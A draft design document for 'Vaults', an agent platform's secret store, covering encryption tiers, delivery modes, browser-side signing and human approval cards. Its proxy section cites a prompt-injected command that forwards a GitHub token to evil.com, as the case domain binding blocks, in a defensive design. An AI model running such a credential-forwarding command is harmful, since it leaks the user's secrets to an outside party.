# Vaults — secret management for agents

Status: **v3 draft for discussion** (no implementation yet)
Owner: Alex + agent session `sestvmy6e5c8e`
Date: 2026-06-13 (v3, after review round 2)

v3 changes (review round 2): decryption locus resolved by **tier split**, not phasing
— protected-tier decryption is browser-side from the first commit, standard-tier is
daemon-side permanently (§8.4); architecture is **frozen up front, delivered
incrementally** — nothing gets ripped out and re-migrated (§15). Signing rebuilt
around a pluggable **SignerProvider** abstraction with a local iframe-isolated
default and opt-in MPC / account-abstraction providers (§8). Inline **approval
card** pushed into the session as a structured message, reusing the quick-reply
rails (§9). Provider/library survey expanded (§14). Decision log updated (§16).

## 1. Background

Agents constantly need third-party credentials (API keys, tokens, signing keys).
Today in Avibe every credential is plaintext: platform tokens and provider API
keys live in `~/.avibe/config/config.json` / `~/.avibe/state/settings.json`, and
anything an agent needs at runtime ends up pasted into chat, written into
`.env` files by hand, or exported in the shell. Whatever enters the
conversation enters the LLM context — transcripts, IM history, provider logs.

PR #555 ("redact config secrets") added response-side masking and a frontend
`secretFields.ts` registry — the first step of the same arc. The Web UI shell
already reserves the surface: a `/vaults` route and `VaultsPage.tsx`
placeholder exist alongside Agents / Skills / Harness.

The industry hit the same wall in 2025–2026: GitGuardian found 24k+ secrets
exposed in MCP config files; OWASP lists credential leakage via prompt context
as a top LLM risk; a wave of "vault for agents" products appeared
(Infisical agent-vault, Agentic Vault, Axis, Arcade, Composio — see §14).
The shared insight, which is also the core principle of this design:

> **Secrets must never enter the model's context. The model handles secret
> *names*; the platform handles secret *values*.**

## 2. Goals and non-goals

Goals:

1. **Store** — a Vaults page where the user manages named secrets
   (`NAME` → value, env-var mental model), with two protection tiers.
2. **Deliver** — agents obtain secrets via CLI with values never written to
   stdout; delivery is indirect (child-process env, file render, signing,
   brokered HTTP), so values stay out of context by construction.
3. **Ask** — agents can request a missing secret; the user fills it through a
   trusted UI channel (never through chat text), and the agent is woken up
   with the *name only*.
4. **Approve** — protected secrets require explicit, per-use human approval
   with an auditable record, surfaced **inline in the session** as an
   interactive card. Approval happens on the web UI only (decided, §9).
5. **Link** — secrets relate to Skills (skill declares what it needs; vault
   shows per-skill fill-in status).
6. **Sign** — the vault is a signing oracle behind a **pluggable provider
   abstraction**: a local iframe-isolated software signer by default
   (private key never leaves the browser), with opt-in MPC / threshold and
   account-abstraction (session-key) providers so a single API covers
   single-key, key-sharding, and on-chain-policy signing (decided, §8).

Non-goals (now):

- Team/multi-user sharing — Avibe is personal; one user per instance.
- Replacing provider OAuth flows (Claude/Codex login stays as is); migrating
  platform/provider config secrets into the vault is a later capability (§15).
- Defending against a fully malicious agent running as the same OS user (§3).
- On-chain transaction *broadcasting* — signing is the vault's job;
  broadcasting needs no secret and stays agent-side (§8).
- Building any cryptosystem from scratch: we orchestrate audited primitives
  (`pyca/cryptography`, `@noble/curves`, `viem`, `argon2`) and integrate
  third-party custody (MPC/TEE) — we do not invent crypto.

## 3. Threat model

| # | Threat | Defense |
| --- | --- | --- |
| T1 | Secret value accidentally enters LLM context / transcripts / IM history | values never on stdout; injection below the agent's text channel; dynamic ask goes through UI, not chat |
| T2 | DB/file exfiltration (backups, `vibe data query`, casual `cat`) | everything encrypted at rest (envelope, §7); vault tables denylisted in `data query` |
| T3 | Agent (possibly prompt-injected) uses a high-value secret without the user knowing | `protected` tier: per-use approval enforced **cryptographically** — the unlock factor is not on the machine; for keypairs, the private key cannot even be assembled without the browser |
| T4 | Agent exfiltrates the value after legitimate delivery | sign/proxy modes: value never materializes in agent-accessible space; outbound redaction (§10) as a tripwire |

Out of scope, stated honestly:

- A malicious process running as the same OS user can read M1/M2-injected
  files/env or call the same decryption path the CLI uses for the `standard`
  tier. Standard tier prevents *accidents and remote exfiltration*, not a
  determined local attacker. Protected tier + sign/proxy modes are the answer
  when that matters — the design is a ladder, not one switch.
- Approval fatigue: cards must show enough context (requester, delivery form,
  decoded payload) to make rubber-stamping visibly risky; per-secret policies
  (§9) reduce prompt frequency.
- An *actively* compromised daemon can serve malicious browser JS and defeat
  browser-side crypto (§8.4). We trust the daemon's integrity (it's the user's
  own machine); browser-side crypto minimizes *passive* exposure, it is not
  E2EE against a hostile server. Same boundary as the Bitwarden web vault.

## 4. Concepts and data model

Four tables (SQLAlchemy `Table` in `storage/models.py` + Alembic migration),
plus vault config in `state_meta`.

### `vault_secrets`

| column | notes |
| --- | --- |
| `id`, `created_at`, `updated_at` | usual |
| `name` | unique, ENV-style (`^[A-Z][A-Z0-9_]*$`), global namespace |
| `kind` | `static` (a value) \| `keypair` (a signing key) |
| `protection` | `standard` \| `protected` |
| `signer_kind` | keypair only: `local` \| `mpc:<provider>` \| `aa` \| `external` (§8) |
| `ciphertext`, `nonce`, `wrap_meta` | envelope-encrypted value/private material (§7); `wrap_meta` = wrapped-DEK copies + KDF params, **client-unwrappable**; null for `external`/`mpc` where we hold no key |
| `public_meta` | JSON: description; keypair: algo, public key, address, derivation path, provider handle |
| `policy` | JSON: allowed delivery modes, allowed hosts (proxy), `always_ask`, signer limits |
| `last_used_at`, `use_count` | surfaced in UI |

Protection tiers (refines the original 明文/加密):

- **`standard`** ("plain" UX): no interaction to use. *Encrypted at rest* under
  a machine key (§7.2). "Plaintext" = the experience (zero friction), not the
  storage. Decryptable by the daemon → works headlessly.
- **`protected`** ("encrypted" UX): wrapped under a key derived from a user
  factor (vault password, passkey PRF). Every use needs approval + the unlock
  factor, which lives on the user's device — the daemon cannot decrypt alone.
- `keypair` secrets are always `protected` (hard rule).

### `vault_requests` — one queue for everything that needs a human

`request_type`: `provision` (fill a missing secret) \| `access` (use a
protected secret) \| `sign` \| `proxy` \| `keygen`. Columns: `id`, timestamps,
`expires_at`, `secret_name`, `requester` (session/agent/run JSON), `delivery`
(mode + details: env var, file path, decoded payload preview, target host),
`status` (`pending`→`fulfilled`/`approved`/`denied`/`expired`/`canceled`),
`message_id` (the inline card carrying it).

### `vault_links`

`secret_name` ↔ `skill_name`, `source` (`skill_meta`/`agent`/`user`),
`required`. Skill-meta links synced from SKILL.md frontmatter (§13).

### `vault_audit`

Append-only: `ts`, `event`, `secret_name`, `requester`, `delivery` summary,
`request_id`. Values never appear. Vaults-page log tab.

`vibe data query` gains a denylist for `vault_secrets`;
`vault_requests`/`vault_links`/`vault_audit` stay queryable.

## 5. Delivery modes — the security ladder

Four ways a secret leaves the vault, exposure descending. Per-secret `policy`
restricts allowed modes (e.g. GitHub PAT: proxy-only).

- **M1 `run`** — child-process env (default; the `op run` pattern):
  `vibe vault run --env OPENAI_API_KEY -- python sync.py`. Values into the
  child env only, nothing on stdout, gone when the child exits.
- **M2 `inject`** — file render (the `op inject` pattern):
  `vibe vault inject --keys A,B --out .env [--ttl 10m]` or `--template t.tpl`.
  Written `0600`, audited with path, optional daemon-side TTL cleanup. Agent
  is told the path, never the content.
- **M3 `sign`** — signing oracle / wallet; the key never leaves the signer
  (§8). Only the signature (not a secret) returns.
- **M4 `proxy`** — brokered HTTP:
  `vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/...`.
  Daemon attaches the credential per the secret's auth template and forwards;
  agent sees only the response. **Domain binding** (allowed-hosts, deny by
  default) makes a prompt-injected `fetch --auth GITHUB_PAT https://evil.com`
  fail closed.

## 6. Dynamic ask — `$<NAME>` and `vibe vault request`

Agent emits `$<OPENAI_API_KEY>` in a reply (or calls
`vibe vault request NAME --wait 600`). `core/reply_enhancer.py` (existing
chokepoint for silent blocks / file links / quick replies) extracts the marker
(`\$<[A-Z][A-Z0-9_]*>`, outside code fences, same fence guard as mentions)
into a `provision` request, and:

- **Web/workbench**: the message carries an inline **SecureInputCard** (name +
  requester + protection picker + masked input + Save). Submission is an
  out-of-band `POST /api/vault/...` over TLS — never the chat transcript.
- **IM**: marker replaced with `🔐 Agent requests OPENAI_API_KEY →
  [Open Vaults](https://<tunnel>/vaults?request=<id>)` via the per-platform
  formatter layer.

`--wait` long-polls until fulfilled/denied/timeout (agent keeps working when
the answer lands, mid-turn); `--no-wait` returns and the daemon `hook_send`s
the originating session on fulfillment (existing
`TaskExecutionStore.enqueue_hook_send` path).

**Hard rule: the wake-up/fulfillment message carries the secret *name* only,
never the value.** A value in the resume prompt would undo the whole design.

## 7. Crypto design

### 7.1 Envelope

```
value --AES-256-GCM--> ciphertext           (DEK: random 32B per secret)
DEK   --wrapped by--> KEK(s)                 (wrap_meta holds all copies)
  standard:  KEK_machine  = random 32B machine key (§7.2)   [daemon-side]
  protected: KEK_password = Argon2id(vault password, salt)  [browser-side, §8.4]
             KEK_passkey  = HKDF(WebAuthn PRF output)        [browser-side]
```

A protected DEK can be wrapped by password + N passkeys; losing one factor
doesn't lose the secret while another remains. Password is the recovery root.

### 7.2 Machine key (standard tier): source, loss, recovery

- **Source**: 32 random bytes (`os.urandom`) on first vault write. Not derived
  from anything.
- **Default — key file**: `~/.avibe/state/vault/machine.key` (`0600`). It lives
  *inside* `~/.avibe`, so any backup/migration of the state dir carries it:
  **no new loss mode** (you lose it only when you've lost the DB too), and
  "copy `~/.avibe` to a new machine" keeps working.
- **Opt-in hardening — OS keychain** (`keyring`): key and data physically
  separated (stealing the DB + all files still isn't enough). Cost: copying
  `~/.avibe` alone no longer migrates the vault → requires
  `vibe vault key export/import` (Argon2id-wrapped). Headless boxes (Incus
  tenants, no Secret Service) auto-fall back to file mode.
- **Failure UX**: ciphertext present but key missing/mismatched (detected via a
  key-check value) → Vault lists affected secrets and offers import-the-key or
  re-enter-the-values (standard-tier secrets are re-obtainable API keys).
  AES-GCM authentication prevents silent wrong-key garbage.

### 7.3 Protected tier: factors and recovery

- **Vault password** (P0): Argon2id (`argon2`, interactive params ~0.5–1s) →
  KEK. Set/changed on the Vaults page; a change re-wraps every protected DEK
  (cheap — DEKs are 32B; ciphertexts untouched).
- **Passkey PRF** (P0/P1): WebAuthn PRF → HKDF → KEK, an *additional* wrap.
  2026 support good on synced providers (iCloud/Google/Windows Hello), not
  universal → enhancement over password, never the only factor.
- **Recovery, plainly**: forget the password with no passkey wrap → protected
  *values* are unrecoverable by design. API-key-like secrets: re-enter.
  Wallets: the BIP-39 mnemonic from the key ceremony (§8). No server-side
  reset because there is no server.

### 7.4 Primitives and dependencies

- `pyca/cryptography` (in-tree via web push): AES-256-GCM, HKDF, ed25519.
- `argon2-cffi` (small new dep, daemon side for `key export` only) + argon2
  WASM (`hash-wasm`) browser-side.
- `keyring` (optional import): keychain mode only.
- Signing libs are provider-specific (§8); the `[wallet]` extra pulls the
  local-signer JS/py stack.
- Python can't truly zeroize memory; accepted for a local-first tool. The
  browser-side path (§8.4) means the password's KDF never runs in the daemon
  at all.

## 8. Wallet & signer architecture (decided: direct to ETH, pluggable)

### 8.1 The abstraction is the deliverable

A keypair secret carries a `signer_kind`; the vault exposes one **sign request
→ approval → signature** flow regardless of backend. This is what makes
"single-key today, sharding/MPC/multisig later" a config choice, not a
rewrite. Four kinds across the custody spectrum:

| `signer_kind` | where the key lives | who can sign | best for |
| --- | --- | --- | --- |
| **`local`** (default) | software key, **encrypted at rest in the vault**, decrypted only inside an isolated browser iframe | user, present, per-signature approval | local-first, no account, no cloud, full self-custody |
| **`mpc:<provider>`** | sharded/TEE across provider + device, key never whole (Privy / Web3Auth / Turnkey / Lit) | per provider policy; can be **unattended under caps** | no single point of failure; headless policy signing |
| **`aa`** (ERC-4337 session keys) | owner key = any kind above; agent gets a **scoped, time-boxed, spend-capped session key** enforced on-chain | agent, within on-chain limits | agent autonomy with chain-enforced guardrails |
| **`external`** (WalletConnect) | the user's real wallet (MetaMask/Rabby); vault custodies **nothing** | user, in their own wallet | zero custody risk |

The vault's job shrinks to "route the sign request to the configured provider,
render the approval, return the signature." `local` ships first as the
local-first default; `mpc`/`aa`/`external` are first-class plug-ins behind the
same interface (`SignerProvider` with `address()`, `sign(payload, type)` for
tx / EIP-191 / EIP-712).

### 8.2 Your three signer questions, answered

- **(a) Are the mnemonic and private key encrypted at rest like other
  secrets?** Yes, for `signer_kind=local`: mnemonic + derived private key are
  secret material, envelope-encrypted under the **protected** tier (always —
  hard rule). The public key + address are `public_meta` (not secret). For
  `mpc`/`external` the vault stores no private key at all — only a provider
  handle / wallet address — so there's nothing local to encrypt.
- **(b) Decrypt in the browser, then sign in the browser?** Yes — and this is
  the *same* browser-side decryption as any protected secret (§8.4), not a
  second mechanism. The private key is unwrapped and used **only inside the
  isolated iframe**; the iframe returns the **signature**; the signature (not a
  secret) flows daemon → CLI → agent. The private key never reaches the daemon.
- **(c) Mature implementation? Browser sandbox?** Yes — this is exactly how
  embedded-wallet providers (Privy, Magic, Dynamic) build self-custody. The
  mature pattern is **cross-origin iframe isolation** (§8.3).

### 8.3 Local signer: cross-origin iframe isolation (the mature pattern)

The signer runs in an iframe served from a **different origin** than the
workbench app, so app-level XSS can never read the key:

- key material exists **only in the iframe's memory**, never persisted, never
  in the host page's scope;
- host ↔ iframe communicate via **origin-validated `postMessage`**; the host
  gets a `viem` account via `toAccount(...)` whose `signMessage` /
  `signTransaction` / `signTypedData` proxy into the iframe;
- the iframe does the actual ECDSA with **`@noble/curves`** (audited
  secp256k1, the lib `viem`/`ethers` already use) and BIP-39 via `@scure/bip39`;
- iframe served with **`COOP: same-origin` + `COEP: credentialless`** for
  cross-origin isolation (Spectre/side-channel hardening);
- the **transaction-decode + approve UI renders inside the trusted iframe**, so
  a clickjacked/synthetic-click approval in the host can't authorize a
  signature the user didn't see.

Honest caveat the `@noble` authors themselves state: if an attacker can read
process memory it's game over — which is *why* the separate-origin iframe (own
memory space) is the boundary that matters. Implementation wrinkle for a
local-first/tunnel setup: we need a genuinely distinct origin for the signer
(dedicated path with strict CSP, separate port, or a `signer.` subdomain on the
tunnel) — flagged as a real build task, not hand-waved.

### 8.4 Decryption locus — resolved by tier, not by phase

This addresses both review points ("do front-end decryption in P0" and "don't
phase it / lock the architecture now"). The migration worry dissolves once the
two tiers are separated by their unlock factor:

- **Standard tier → daemon-side, permanently.** Standard secrets are used
  *headlessly* — `vibe vault run` at 3am, no human, no browser in the loop. The
  unlock factor is the machine key on the box. Front-end decryption here is not
  just unnecessary, it's *impossible without breaking silent use* (the 80%
  case). This is not an interim to migrate; it's correct and final.
- **Protected tier → browser-side, from the first commit.** Protected use
  *always* has a human + browser (approval is required by definition), so
  browser-side decryption adds **zero** new friction — the approval ceremony
  *is* the decryption ceremony. The daemon ships only the salt + wrapped DEK;
  the browser derives the KEK (argon2 WASM for password, WebCrypto HKDF for
  passkey PRF), unwraps the DEK, decrypts the value, and POSTs **only that one
  value** back over TLS for injection (or, for `local` keypairs, signs in-iframe
  and returns only the signature). **The vault password never reaches the
  daemon — ever, from day one.** No daemon-side KDF interim, no migration.

Why this is the right split (the difference is *blast radius*): a daemon-side
KDF would put the master password — which unlocks the whole vault, including
future secrets — into daemon memory on every approval. Browser-side keeps the
password on the user's device; the daemon only ever sees the single value being
delivered. And passkey PRF is *physically* a browser ceremony anyway. The
`wrap_meta` wire format is client-unwrappable from the first migration, so there
is nothing to re-shape later.

## 9. Approval flow — inline interactive card in the session

**Decided: approval is web-only** (an IM account is a weaker authenticator than
the OIDC-gated web session). Per round-2 direction, the approval is **pushed
into the current session as a structured message and rendered inline as an
interactive card**, rather than making the user navigate to /vaults — the user
is already in the conversation with the agent.

Codebase reality (verified) and the resulting design choice:

- A `system` message *type* already exists in `core/message_dispatcher.py`, but
  `core/message_mirror.py` **deliberately does not persist `system` messages**
  ("init banners / status lines — noise in history"). An approval card must
  survive reload and headless arrival and appear in history for audit, so it
  **cannot** ride the non-persisted `system` type as-is.
- The clean path reuses the **quick-reply rails** (the existing inline-
  interactive precedent): persist the card as a transcript message
  (`author='system'` for the visual treatment, a persisted `type`) carrying a
  `content.card_type='approval'` spec + `metadata._approval_id`; render a new
  `ApprovalCard` branch in `ChatPage.tsx`'s message switch; the user's
  approve/deny posts out-of-band to `/api/vault/requests/{id}/approve` (carrying
  the browser-derived material per §8.4), and the choice is recorded **set-once**
  on the card row exactly like `quick_reply_chosen`.
- **One required new rail**: there is no `message.updated` SSE wired into the
  workbench today (only IM has it). We add it so the card can flip to
  `approved`/`denied` **in place** for any viewer and after the blocked CLI
  unblocks — a small, generally useful addition (in-place message patching).

Surfaces, by where the session lives:

- **Web session** → inline `ApprovalCard` in the transcript (primary).
- **IM session** → notification + deep link to the web card (IM can't render
  secure interactive inputs; and approval is web-only anyway).
- **Headless** (no active session/agent-run) → the card persists; the Vaults
  page **inbox** is the aggregate fallback surface. All three back the same
  `vault_requests` row.

Flow: agent runs `vibe vault run --env STRIPE_KEY -- ...` (protected) → daemon
creates `access` request, CLI blocks → card pushed to the session + SSE +
(IM) notify → user reviews delivery form (env→command / file path / decoded tx
/ target host) and approves with password/passkey **in the browser** → §8.4
yields the value → daemon completes the blocked `resolve` over UDS → audit →
`message.updated` flips the card. Deny/timeout → CLI exits nonzero with a clean,
relayable error. Standard-tier uses skip the card (silent, audited; per-secret
`always_ask` can opt in).

## 10. Outbound redaction (tripwire)

The dispatcher (`core/message_dispatcher.py`) is the single outbound chokepoint:
scan outgoing messages for known plaintext values (standard-tier; protected
during an active grant window), replace with `[REDACTED:NAME]` + audit +
warning toast. Exact-match plus base64/url-encoded variants — cheap, no
heuristics. Turns "agent echoed the secret" from a breach into a logged
near-miss. P0/P1.

## 11. API and CLI surface

REST (`/api/vault/*`, existing web auth + CSRF): `GET/POST/PATCH/DELETE
/secrets`, `GET /requests?status=pending`, `POST /requests/{id}/fulfill`
(provision), `POST /requests/{id}/approve` (access/sign/proxy; carries
browser-unwrapped material), `POST /requests/{id}/deny`, `GET/POST/DELETE
/links`, `GET /audit`, `POST /keys/generate`→`/confirm` (web-only ceremony,
mnemonic shown once between the two calls), `GET/POST /config` (password,
machine-key mode), `GET /signers` (available provider kinds). SSE on the
existing `/api/events`: `vault.request.new`, `vault.request.decided`,
`vault.secrets.changed`, plus the new generic `message.updated`.

Internal UDS (`/internal/vault/*`, daemon ⇄ CLI): `resolve`
(`{names,mode,requester,wait}` → values; blocks on protected approval),
`provision`, `sign` (`{key,payload,sig_type}` → blocks → signature), `fetch`
(proxy), `requests/{id}/wait` (long-poll).

CLI (`vibe vault …`): `set NAME [--protected] --stdin|--from-file f` (argv
values rejected by design), `list [--skill S] [--json]`, `rm`, `run`, `inject`,
`request`, `link/unlink`, `audit`, `key export/import`, `sign --key NAME
(--eth-tx f|--message s|--typed-data f) [--out f]`, `fetch --auth NAME …`. No
command prints a value; there is deliberately no `vibe vault get`.

## 12. End-to-end flows

- **Standard / M1 (silent)**: agent → `vault run` → UDS `resolve` → daemon
  machine-KEK unwrap → value over UDS → child env → audit. No human.
- **Protected / M1 (approval)**: as above until daemon sees `protected` →
  `access` request → inline card → user approves in browser (§8.4) → daemon
  completes blocked `resolve` → child env. Deny/timeout → CLI exits 1.
- **Dynamic ask (web)**: `$<NEW_KEY>` → SecureInputCard → save → wake-up (name
  only) → agent proceeds.
- **ETH sign (local signer)**: web key ceremony (mnemonic once) → agent builds
  `tx.json` via its own RPC → `vault sign --key ETH_MAIN --eth-tx tx.json` →
  inline approval card decodes `to/value/gas/chainId/selector` → user approves
  → **iframe** decrypts key + signs → signature → agent broadcasts via its own
  RPC. Private key + mnemonic never leave the iframe / the user's one-time view.
- **ETH sign (mpc / aa)**: same request shape; `sign` routes to the provider;
  `aa` may let the agent's pre-authorized session key sign within on-chain caps
  without a per-tx prompt.

## 13. Skills integration

SKILL.md frontmatter gains `secrets:` (name/required/description). Avibe reads
skill metadata only via `askill --json` (`core/services/skills.py`) → askill
(our repo) must parse/pass it through. Vaults page gets a per-skill view
(✓ configured / ✗ missing + one-click fill); `vault_links` synced with
`source=skill_meta`. Agents can `vibe vault link --skill S NAME` then `request`;
users link/unlink in the UI. Names are the global join key.

## 14. Prior art and library survey

- **Injection UX** — 1Password [`op run`/`op inject`](https://developer.1password.com/docs/cli/secret-references/),
  [Infisical `infisical run`](https://infisical.com/docs/documentation/platform/secrets-mgmt/overview).
  M1/M2 are these, vault-local.
- **Brokered credentials** — [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade)
  ("LLM never sees the token", JIT user auth), [Composio](https://docs.composio.dev/docs/authentication)
  (Connect Links ≈ our dynamic ask). Validates M4 + ask flow.
- **Vault-for-agents OSS** — [Infisical agent-vault](https://github.com/Infisical/agent-vault)
  (MIT Go; MITM proxy + dummy-placeholder-at-egress; egress allowlists;
  "Preview") — P3 transparent-proxy candidate; Agentic Vault (MCP, per-secret
  allowlists, AGPL); Axis (master key in OS keychain). None has our IM surface /
  inline approvals / skills linkage.
- **In-browser signing** — [`@noble/curves`](https://paulmillr.com/noble/)
  (audited secp256k1; `viem` uses it internally), [`viem` `toAccount`](https://viem.sh/docs/accounts/local/toAccount)
  (custom account → proxy to iframe), cross-origin iframe isolation +
  `COOP`/`COEP` ([MDN credentialless](https://developer.mozilla.org/en-US/docs/Web/Security/IFrame_credentialless)).
- **Embedded-wallet self-custody** — [Privy](https://privy.io/blog/how-privy-embedded-wallets-work)
  (SSS key-sharding + iframe, now TEE 2-of-2; Privy→Stripe 2025); Magic, Dynamic
  (→Fireblocks) — the iframe-isolation reference for `local`.
- **MPC / threshold custody** (the `mpc:<provider>` plug-ins):
  [Web3Auth](https://web3auth.io/docs/sdk/mpc-core-kit/mpc-core-kit-js)
  (MPC-TSS + social login; →Consensys 2025; ~<1.2s sign),
  [Lit Protocol](https://developer.litprotocol.com/user-wallets/pkps/overview)
  (PKPs, DKG threshold + programmable Lit Actions; most decentralized),
  [Turnkey](https://www.turnkey.com/solutions/ai-agents) (TEE/Nitro, 50–100ms,
  policy engine). Trade-off to weigh: MPC providers mean cloud accounts /
  per-signature pricing / vendor risk — they cut against local-first, so they
  stay **opt-in**, never the default.
- **Account abstraction / session keys** (the `aa` plug-in) — ERC-4337 + Safe /
  [ZeroDev](https://github.com/coinbase/agentkit) session-key SDK + Pimlico;
  ERC-7715/7710 standardize scoped, redeemable, spend-capped grants
  ([account abstraction explained](https://eco.com/support/en/articles/15254036-what-is-erc-4337-account-abstraction-explained-2026)).
  The agent-native way to give chain-enforced limited authority instead of a
  master key.
- **Passkey-derived encryption** — [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/),
  [Bitwarden passkey unlock](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
  2026 status per [Corbado](https://www.corbado.com/blog/passkeys-prf-webauthn):
  enhancement over password, multi-wrap DEK.

Why not embed a vault wholesale: Infisical proper is Postgres+Redis+Node (absurd
for a personal local-first tool); agent-vault is proxy-shaped, "Preview", no
human-approval loop. The product surface we need (Vaults page, inline cards,
skills linkage, dynamic ask) is Avibe-native regardless. Build the thin store +
signer abstraction on audited primitives; integrate (don't build) MPC/AA custody
behind it.

## 15. Architecture frozen up front, delivery incremental

Per round-2 direction: **lock the architecture now so nothing gets ripped out
and re-migrated.** The data model, the `wrap_meta` wire format (client-
unwrappable), the daemon/browser decryption split (§8.4), the `SignerProvider`
interface, and the inline-card message shape are **final from the first commit**.
Delivery still lands as focused commits on that frozen shape (one branch, one
PR at a checkpoint) — but no commit invalidates an earlier one, and there is no
"daemon-side now, browser-side later" rewrite. "No phasing" = no throwaway
architecture, not "ship everything in one drop."

Capability rollout on the frozen architecture (order, not re-architecture):

1. Store + envelope (both tiers' formats) + Vaults CRUD + `data query` denylist.
2. M1/M2 delivery + dynamic ask (`$<NAME>` + SecureInputCard + IM deep link).
3. Protected tier + browser-side decryption + inline ApprovalCard +
   `message.updated` SSE + outbound redaction.
4. Skills `secrets:` linkage + keychain mode + `key export/import`.
5. `local` signer (iframe isolation, BIP-39 ceremony, EIP-155/191/712 decoded
   approvals).
6. `mpc` / `aa` / `external` signer plug-ins; `vault fetch` broker.
7. Transparent proxy option; migrate platform/provider config secrets into the
   vault (closes the #555 arc); signer policy engine; session-scoped grants.

## 16. Decision log

Locked, round 1 (2026-06-12): approval web-only; signer direct to secp256k1/ETH
on open-source stack; phasing structure approved.

Locked, round 2 (2026-06-13):
1. Protected-tier decryption is **browser-side from the first commit**; standard
   tier stays daemon-side permanently (tier split, not a migration) (§8.4).
2. **Architecture frozen up front, delivered incrementally** — no rip-and-
   replace (§15).
3. Signing is a **pluggable `SignerProvider`**: `local` (iframe-isolated
   software key) default; `mpc`/`aa`/`external` opt-in plug-ins (§8).
4. Local keypair material (mnemonic + private key) is envelope-encrypted under
   the protected tier; signing happens **in the isolated browser iframe**, only
   the signature leaves (§8.2/8.3).
5. Inline **ApprovalCard** in the session via a persisted structured message +
   quick-reply rails + new `message.updated` SSE (not the non-persisted `system`
   type) (§9).

Proposed in v3, awaiting confirm:
6. `local` is the **default** signer (local-first); MPC stays opt-in given its
   cloud-account / pricing / vendor-lock-in cost. Agree?
7. Of the MPC plug-ins, integrate which **first** — Lit (most decentralized,
   local-aligned), Turnkey (fastest, policy engine), or Web3Auth (social-login)?
   Or defer all until a concrete unattended-signing need appears?
8. `argon2` WASM (`hash-wasm`) browser-side for the password KDF — OK as the one
   new browser crypto dep?

## 17. Open questions

1. Reveal-on-click for standard-tier values in the UI: allow or never?
2. `request --wait` / protected-access / sign approval timeout (proposal:
   10 min) and how a denied/expired wait reads to the agent.
3. Secret scope: instance-global (env model, recommended) — any per-project
   need to shape the schema now?
4. askill frontmatter extension — confirm we own it + file the issue.
5. ETH preview depth: selector + raw calldata to start, or ABI-decode +
   dangerous-selector warnings (`approve`, `setApprovalForAll`) from day one?
6. `aa` session keys — is "agent gets a chain-capped session key" a near-term
   want (it's the strongest agent-autonomy story), or later?
